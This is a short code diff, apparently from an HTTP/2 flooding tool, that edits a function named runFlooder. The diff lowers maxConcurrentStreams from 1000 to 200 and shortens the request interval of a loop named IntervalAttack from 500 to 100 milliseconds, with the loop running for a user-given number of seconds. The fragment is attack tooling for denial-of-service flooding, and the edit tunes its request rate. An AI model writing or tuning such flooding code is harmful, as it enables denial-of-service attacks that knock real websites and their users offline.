@@ -252,7 +252,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 1000,
+                maxConcurrentStreams: 200,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -278,7 +278,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 500);
+            }, 100);
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
